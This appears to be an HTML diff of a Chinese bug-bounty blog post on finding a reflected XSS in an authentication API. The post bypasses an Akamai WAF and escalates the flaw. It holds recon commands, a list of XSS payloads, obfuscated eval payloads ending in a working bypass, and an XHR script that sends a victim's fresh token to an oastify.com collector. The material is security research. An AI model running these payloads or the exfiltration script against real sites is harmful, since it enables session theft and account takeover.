@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="记录一下最近遇到的一个XSS以及尝试升级XSS漏洞的过程。 怎么找到的在hackerone项目里找到一个目标，*.target.com。 爆破以及侦察域名，轻车熟路，建议用shell命令集成好 123456789rm subssubfinder -dL $1 -o subscat $1 | assetfinder --subs-only &gt;&gt; subsamass enum --pass">
+<meta property="og:type" content="article">
+<meta property="og:title" content="一个赏金项目的XSS记录">
+<meta property="og:url" content="http://example.com/2023/11/28/sony-xss/index.html">
+<meta property="og:site_name" content="CaiS1">
+<meta property="og:description" content="记录一下最近遇到的一个XSS以及尝试升级XSS漏洞的过程。 怎么找到的在hackerone项目里找到一个目标，*.target.com。 爆破以及侦察域名，轻车熟路，建议用shell命令集成好 123456789rm subssubfinder -dL $1 -o subscat $1 | assetfinder --subs-only &gt;&gt; subsamass enum --pass">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/sy1.png">
+<meta property="og:image" content="http://example.com/images/sy2.png">
+<meta property="og:image" content="http://example.com/images/sy3.png">
+<meta property="og:image" content="http://example.com/images/sy4.png">
+<meta property="article:published_time" content="2023-11-28T06:58:37.000Z">
+<meta property="article:modified_time" content="2023-11-28T09:46:08.126Z">
+<meta property="article:author" content="CaiS1">
+<meta property="article:tag" content="bugbounty">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/sy1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>一个赏金项目的XSS记录</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/Categories/">categories</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/CaiS1">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/11/22/book/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/11/28/sony-xss/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/11/28/sony-xss/&text=一个赏金项目的XSS记录"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/11/28/sony-xss/&title=一个赏金项目的XSS记录"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/11/28/sony-xss/&is_video=false&description=一个赏金项目的XSS记录"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=一个赏金项目的XSS记录&body=Check out this article: http://example.com/2023/11/28/sony-xss/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/11/28/sony-xss/&title=一个赏金项目的XSS记录"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/11/28/sony-xss/&title=一个赏金项目的XSS记录"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/11/28/sony-xss/&title=一个赏金项目的XSS记录"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/11/28/sony-xss/&title=一个赏金项目的XSS记录"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/11/28/sony-xss/&name=一个赏金项目的XSS记录&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/11/28/sony-xss/&t=一个赏金项目的XSS记录"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%89%BE%E5%88%B0%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">怎么找到的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95-Akamai-WAF"><span class="toc-number">2.</span> <span class="toc-text">绕 Akamai WAF</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8B%93%E5%B1%95%E4%B8%80%E4%B8%8B%E6%88%91%E5%AF%B9%E5%8D%8F%E8%AE%AE%E8%A7%A3%E6%9E%90%E7%BB%95Waf%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">2.1.</span> <span class="toc-text">拓展一下我对协议解析绕Waf的理解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E6%8A%97XSS%E6%A3%80%E6%B5%8B%E9%80%BB%E8%BE%91"><span class="toc-number">2.2.</span> <span class="toc-text">对抗XSS检测逻辑</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7%E5%8F%8D%E5%B0%84XSS"><span class="toc-number">3.</span> <span class="toc-text">升级反射XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96COOKIE"><span class="toc-number">3.1.</span> <span class="toc-text">获取COOKIE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS-CSRF-%E7%BB%84%E5%90%88"><span class="toc-number">3.2.</span> <span class="toc-text">XSS+CSRF 组合</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%86%E5%90%91%EF%BC%88Client-id-%E4%BB%8E%E5%93%AA%E6%9D%A5%EF%BC%9F%EF%BC%89"><span class="toc-number">3.3.</span> <span class="toc-text">逆向（Client id 从哪来？）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E5%92%8C%E9%9A%BE%E7%82%B9"><span class="toc-number">3.4.</span> <span class="toc-text">遇到的问题和难点</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        一个赏金项目的XSS记录
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">CaiS1</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-11-28T06:58:37.000Z" class="dt-published" itemprop="datePublished">2023-11-28</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Bug-Bounty/">Bug Bounty</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/bugbounty/" rel="tag">bugbounty</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>记录一下最近遇到的一个XSS以及尝试升级XSS漏洞的过程。</p>
+<h3 id="怎么找到的"><a href="#怎么找到的" class="headerlink" title="怎么找到的"></a>怎么找到的</h3><p>在hackerone项目里找到一个目标，*.target.com。</p>
+<p>爆破以及侦察域名，轻车熟路，建议用shell命令集成好</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">rm subs</span><br><span class="line"></span><br><span class="line">subfinder -dL $1 -o subs</span><br><span class="line"></span><br><span class="line">cat $1 | assetfinder --subs-only &gt;&gt; subs</span><br><span class="line"></span><br><span class="line">amass enum --passive -df $1 -o subs</span><br><span class="line"></span><br><span class="line">cat subs | sort -u | httpx -t 100 ww &gt;  subhttpx</span><br></pre></td></tr></table></figure>
+
+<p>这样我们就得到了一些域名，可以通过HTTPX查看域名状态，大概心里有个数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat subhttpx | httpx -td -ip -sc -t 100</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>习惯先用waybackurls，看一下历史数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo target.com | waybackurls &gt; back</span><br><span class="line"></span><br><span class="line">cat back | less</span><br></pre></td></tr></table></figure>
+
+<p>如果喜欢在浏览器上看，可以用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://web.archive.org/cdx/search/cdx?url=target.com/*&amp;output=text&amp;fl=original&amp;collapse=urlkey&amp;from=</span><br></pre></td></tr></table></figure>
+
+<p>用grep筛选一下敏感的后缀名，或者urinteresting</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log 、 txt 、 conf 、 cnf 、 ini 、 env 、 sh 、 bak 、 backup 、 swp 、 old 、 ~ 、 git 、 svn 、 htpasswd 、 htaccess 、 php 、 jsp 、 jspx 、 asp 、 aspx 、 do 、 action 、 pl 、 cfm 、 py 、 rb</span><br></pre></td></tr></table></figure>
+
+<p>在筛选出来的数据里，我找到了一个success.jsp的文件，Get参数里有TargetUrl，这里可能有会问题。</p>
+<p>TargetUrl结合success.jsp，猜测是成功登录或者成功执行后转去的URL地址。一般有可能用dom跳转或者JS跳转。使用window.locaiton.href跳转比较常见。</p>
+<p>尝试Dom XSS</p>
+<ol>
+<li>直接修改targetUrl的值变成，javascript:alert()，发现Waf被拦了。</li>
+<li>修改成随机数，看前端有没有函数处理TargetUrl参数，打上断点，没有发现有函数处理，没有发现使用Dom直接跳转。</li>
+</ol>
+<p>看看反射</p>
+<ol>
+<li>修改成随机数之后，发包，发现返回包变成429 Too Many Request，不对劲。</li>
+<li>把之前的参数留着，在原有参数上，加上随机数，返回包正常，在返回包中发现我们的随机数在javscript的location.href的变量里，用双引号包裹。</li>
+</ol>
+<p><img src="/images/sy1.png"></p>
+<ol start="3">
+<li>抱着试一试的心态，使用双引号尝试闭合变量，发现成功了，意味着我们可以直接执行javscript，一个标准的反射XSS。</li>
+</ol>
+<p><img src="/images/sy2.png"></p>
+<h3 id="绕-Akamai-WAF"><a href="#绕-Akamai-WAF" class="headerlink" title="绕 Akamai WAF"></a>绕 Akamai WAF</h3><p>在这个场景下，我们有很多种执行JavaScript代码的选择。</p>
+<ol>
+<li>我闭合这个变量，直接执行JavaScript代码，并闭合后面的双引号。</li>
+<li>在这个变量下，直接使用表达式。我们可以使用运算符（+、-、*、&#x2F;）等等，对这个变量的值进行运算，运算的同时可以执行我们的表达式。</li>
+</ol>
+<p>我选择闭合变量，直接执行javascript代码。那么我们注入的代码应该类似是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;;alert();var a=&quot;</span><br></pre></td></tr></table></figure>
+<p>不出所料，被Akamai拦截。</p>
+<p>凭我多年对抗Waf的经验，以及编写雷池Waf检测逻辑的经验,prompt和comfirm一定是用不了的。<br>我们需要找到一些新颖的表达式，同时符合JavaScript语法，又同时能过Waf。</p>
+<p>靠记忆是很难一下子绕过的，看看之前存下来的常规payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">confirm()</span><br><span class="line">confirm``</span><br><span class="line">(confirm``)</span><br><span class="line">&#123;confirm``&#125;</span><br><span class="line">[confirm``]</span><br><span class="line">(((confirm)))``</span><br><span class="line">co\u006efirm()</span><br><span class="line">new class extends confirm``&#123;&#125;</span><br><span class="line">[8].find(confirm)</span><br><span class="line">[8].map(confirm)</span><br><span class="line">[8].some(confirm)</span><br><span class="line">[8].every(confirm)</span><br><span class="line">[8].filter(confirm)</span><br><span class="line">[8].findIndex(confirm)</span><br><span class="line">window[&#x27;alert&#x27;](0)</span><br><span class="line">parent[&#x27;alert&#x27;](1)</span><br><span class="line">self[&#x27;alert&#x27;](2)</span><br><span class="line">top[&#x27;alert&#x27;](3)</span><br><span class="line">this[&#x27;alert&#x27;](4)</span><br><span class="line">frames[&#x27;alert&#x27;](5)</span><br><span class="line">content[&#x27;alert&#x27;](6)</span><br><span class="line">[7].map(alert)</span><br><span class="line">[8].find(alert)</span><br><span class="line">[9].every(alert)</span><br><span class="line">[10].filter(alert)</span><br><span class="line">[11].findIndex(alert)</span><br><span class="line">[12].forEach(alert);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>又全军覆没了。</p>
+<p>绕过Waf的方式有两种，一种是通过对抗检测XSS的检测逻辑，不管是语义还是正则。一种是从它本身的协议解析入手。</p>
+<h4 id="拓展一下我对协议解析绕Waf的理解"><a href="#拓展一下我对协议解析绕Waf的理解" class="headerlink" title="拓展一下我对协议解析绕Waf的理解"></a>拓展一下我对协议解析绕Waf的理解</h4><p>我们知道，一个完整的请求到达检测引擎之后，检测引擎想检测必然要把参数的Key和Value分开来，Get参数是通过 &amp; 符合进行分隔开的。假如我们能构造一个payload，使得协议解析时对Get参数的分离产生错误，那么检测Payload的分离它也就是错误的。</p>
+<p>来看一个例子，它曾经能绕过Akamai的Waf</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body x=&#x27;&amp;&#x27;onload=&quot;(alert)(&#x27;citrix akamai bypass&#x27;)&quot;&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>在协议解析绕过Waf的空间大很多，只要你有充足的想象力。</p>
+<h4 id="对抗XSS检测逻辑"><a href="#对抗XSS检测逻辑" class="headerlink" title="对抗XSS检测逻辑"></a>对抗XSS检测逻辑</h4><p>回到原点，此payload对于我们来说用处不大，因为我们无法闭合标签并生成新的标签。</p>
+<p>我打算从self对象入手，self返回的对象跟window对象是一模一样的，window对象的常用方法和函数都可以用self代替window，因此self可以直接调用eval函数，当然eval函数比alert、prompt弹窗函数更危险。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&quot;;self[&quot;eval&quot;](alert());var a=&quot;</span><br><span class="line">拦截</span><br><span class="line"></span><br><span class="line">&quot;;self[&quot;ev&quot;+&quot;al&quot;](alert());var a=&quot;</span><br><span class="line">拦截</span><br><span class="line"></span><br><span class="line">&quot;;window[&quot;ev&quot;+&quot;al&quot;](alert());var a=&quot;</span><br><span class="line">拦截</span><br><span class="line"></span><br><span class="line">&quot;;self[/ev/.source+&quot;al&quot;](alert());var a=&quot;</span><br><span class="line">拦截</span><br><span class="line"></span><br><span class="line">&quot;;self[/ev/.source+&quot;al&quot;](window[alert()]);var a=&quot;</span><br><span class="line">拦截</span><br><span class="line"></span><br><span class="line">&quot;;self[/ev/.source+&quot;al&quot;](window[alert()]);var a=&quot;</span><br><span class="line">拦截</span><br><span class="line"></span><br><span class="line">&quot;;self[/ev/.source+&quot;al&quot;](window[&#x27;atob&#x27;](&#x27;YWxlcnQoKQ==&#x27;));var a=&quot;</span><br><span class="line">拦截</span><br><span class="line"></span><br><span class="line">&quot;;self[/ev/.source+&quot;al&quot;](window[&#x27;atob&#x27;](&#x27;YWxlcn&#x27;+&#x27;QoKQ==&#x27;));var a=&quot;</span><br><span class="line">拦截</span><br><span class="line"></span><br><span class="line">&quot;;self[/ev/.source+&quot;al&quot;](window[/at/.source+&#x27;ob&#x27;](&#x27;YWxlcn&#x27;+&#x27;QoKQ==&#x27;));var a=&quot;</span><br><span class="line">拦截</span><br></pre></td></tr></table></figure>
+<p>截取了几个经典的有思路的例子，都被拦截了，期间也换过很多Dom对象，都没有用。</p>
+<p>该去看一点新鲜的Javascript表达式了。<br>[<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference]">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference]</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">逻辑空赋值运算符（x ??= y）仅在 x 是空值（null 或 undefined）时对其赋值。</span><br><span class="line"></span><br><span class="line">&quot;;var a=null;a??=self[&quot;ev&quot;+&quot;al&quot;](alert());a=&quot;</span><br><span class="line">拦截</span><br><span class="line"></span><br><span class="line">&quot;;var a=null;a??=self[/ev/.source+&quot;al&quot;](window[/at/.source+&#x27;ob&#x27;](&#x27;YWxlcn&#x27;+&#x27;QoKQ==&#x27;));var a=&quot;</span><br><span class="line">拦截</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">空值合并运算符（??）是一个逻辑运算符，当左侧的操作数为 null 或者 undefined 时，返回其右侧操作数，否则返回左侧操作数。</span><br><span class="line"></span><br><span class="line">&quot;;const foo = null ?? self[/ev/.source+&quot;al&quot;](window[&#x27;atob&#x27;](&#x27;YWxlcn&#x27;+&#x27;QoKQ==&#x27;));var a=&quot;</span><br><span class="line">拦截</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可选链运算符（?.）允许读取位于连接对象链深处的属性的值，而不必明确验证链中的每个引用是否有效。?. 运算符的功能类似于 . 链式运算符，不同之处在于，在引用为空 (nullish ) (null 或者 undefined) 的情况下不会引起错误，该表达式短路返回值是 undefined。与函数调用一起使用时，如果给定的函数不存在，则返回 undefined。</span><br><span class="line"></span><br><span class="line">&quot;;self?.[/ev/.source+&quot;al&quot;](alert());var a=&quot;</span><br><span class="line">拦截</span><br><span class="line"></span><br><span class="line">&quot;;self?.[/ev/.source+&quot;al&quot;](window?.[/at/.source+&#x27;ob&#x27;](&#x27;YWxlcn&#x27;+&#x27;QoKQ==&#x27;));var a=&quot;</span><br><span class="line">成功</span><br></pre></td></tr></table></figure>
+
+<p>最终Payload，Akamai倒在了 可选链运算符(?.)。</p>
+<p>不仅如此，我们不仅能执行弹窗函数，我们可以执行任意的JavaScript代码。</p>
+<p>在赏金项目中，我常常不满足发现XSS后，只对它进行弹窗函数，我认为这是对XSS的不尊重，它明明可以实现更大的威力，只是我们小瞧了它。在hackerone和bugcrowd的项目中，反射XSS如果没有特殊情况，一般是中危。下一步我们尝试把它升级成高危。</p>
+<h3 id="升级反射XSS"><a href="#升级反射XSS" class="headerlink" title="升级反射XSS"></a>升级反射XSS</h3><p>上文没有提到，出现XSS的域名非常有意思，它的全称是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://auth.api.target.com</span><br></pre></td></tr></table></figure>
+<p>相信很多人都能看出来它的作用，是用来获取TOKEN的API。</p>
+<h4 id="获取COOKIE"><a href="#获取COOKIE" class="headerlink" title="获取COOKIE"></a>获取COOKIE</h4><p>寻找它的登录网站，看看是哪个登录网站调用了这个API，运气很好，是用户个人登录平台，谁都可以注册账号并登录。它的域名是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://id.target.com</span><br></pre></td></tr></table></figure>
+<p>注册登录后，打开浏览器控制台，发现主要的Token都有HTTP-ONLY的保护，意味着我们不能通过document.cookie拿走用户的TOKEN并登录。</p>
+<h4 id="XSS-CSRF-组合"><a href="#XSS-CSRF-组合" class="headerlink" title="XSS+CSRF 组合"></a>XSS+CSRF 组合</h4><p>既然不能直接拿用户Token，想升级成高危，就必须对敏感的API用CSRF进行操作。</p>
+<p>常见的敏感操作有 删除账户，修改密码，修改手机号，修改邮箱等等。</p>
+<p>非常幸运的是，此域名获取的TOKEN全部是通过 <a target="_blank" rel="noopener" href="https://auth.api.target.com/">https://auth.api.target.com</a> 来获取，那意味着我们不会面临跨域的问题，所有的COOKIE都会随着XSS的发送去自动发送。</p>
+<p>我找到了一个API，它的作用是获取一个新的TOKEN，所需的用户权限完全在COOKIE中，意味着我可以发送一个请求，再把返回包发到自己的域名，这样就完成了窃取Token的效果。</p>
+<p>我写了以下的JavaScript代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var xhr = new XMLHttpRequest();</span><br><span class="line">xhr.open(&quot;POST&quot;, &#x27;/v2/token&#x27;, false);</span><br><span class="line">xhr.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">xhr.withCredentials = true;</span><br><span class="line">xhr.onload = function () &#123;</span><br><span class="line">    var x = new XMLHttpRequest();</span><br><span class="line">    x.open(&quot;GET&quot;, &#x27;https://ro22mp37i96d22zup2zesivhm8szgq4f.oastify.com/?a=&#x27;+encodeURIComponent(xhr.responseText), false);</span><br><span class="line">    x.send(null);</span><br><span class="line">    alert(&quot;over&quot;);</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line">xhr.send(&quot;type=sso_cookie&amp;client=72a7bea8-f31a-47d9-a604-2e71dee24ee0&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>我把这段JavaScript代码全部Base64编码，填充到XSS Payload中，访问链接。</p>
+<p>如愿以偿，我得到了返回包的payload。</p>
+<p>但是在代码中的alert(“over”)却不会被执行，因为涉及到了跨域，但这不影响请求包的发送。</p>
+<p>接下来问题来了，我本以为这个域名完全没有csrf Token的保护，但现实是，在POST请求参数中，有一个参数是client，它的形式是uuid，完全不可猜测。</p>
+<p>在我接下来的测试过程中发现，它和用户强绑定，没有它不行。这意味着我无法获取到一个未知用户的Token，因为我不知道用户的client id。</p>
+<h4 id="逆向（Client-id-从哪来？）"><a href="#逆向（Client-id-从哪来？）" class="headerlink" title="逆向（Client id 从哪来？）"></a>逆向（Client id 从哪来？）</h4><p>Client id 从哪来？只有一种情况，从后端发过来的，因为它和用户强绑定，且在很多API中，没有发生改变，证明和时间戳也没有关系。</p>
+<p>由于我在测试过程中，一直打开Burpsuite进行抓包，于是我可以很轻松的找到发送Client id的全部请求包和返回包，在History标签页，搜索72a7bea8-f31a-47d9-a604-2e71dee24ee0，惊人的发现，在所有的返回包中，没有找到72a7bea8-f31a-47d9-a604-2e71dee24ee0，只有在请求包里存在。</p>
+<p>没有办法，只能进行逆向。看看到底是如何生成的。</p>
+<p>在浏览器进行断点<br><img src="/images/sy3.png"></p>
+<p>刷新浏览器，使用过这个API的所有变量和堆栈都清晰可见。</p>
+<p>跟着堆栈一直找，找到了生成client的生成算法</p>
+<p><img src="/images/sy4.png"></p>
+<p>经过调试发现 e 是一串固定的字符串。</p>
+<p>我于是在Burpsuite中搜寻这串字符串，发现在<a target="_blank" rel="noopener" href="https://id.target.com/">https://id.target.com</a> 的某一个JS文件中，问题解决了。</p>
+<p>我只要去访问 <a target="_blank" rel="noopener" href="https://id.target.com/">https://id.target.com</a> 用正则匹配这串字符串，紧接下来再自己生成ID就好了。</p>
+<p>问题就在于，这样就涉及到了跨域问题。如果在<a target="_blank" rel="noopener" href="https://id.target.com/">https://id.target.com</a> 没有配置跨域，那么我们无论如何也拿不到 <a target="_blank" rel="noopener" href="https://id.target.com/">https://id.target.com</a> 的返回包。</p>
+<p>幸运的是可以进行跨域并读取，接下来就是常规操作了。</p>
+<h4 id="遇到的问题和难点"><a href="#遇到的问题和难点" class="headerlink" title="遇到的问题和难点"></a>遇到的问题和难点</h4><p>在第一次进行xhr请求时，由于我们注入的点在location.href上，浏览器会自动跳转，而我设置的JavaScript请求是异步的，也就是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhr.open(&quot;POST&quot;, &#x27;/v2/token&#x27;, true);</span><br></pre></td></tr></table></figure>
+
+<p>导致没有返回包就结束了，火狐会爆出NO_BINGED_ABORTED的错误，百思不得其解，后来才设置为同步。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/Categories/">categories</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="http://github.com/CaiS1">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
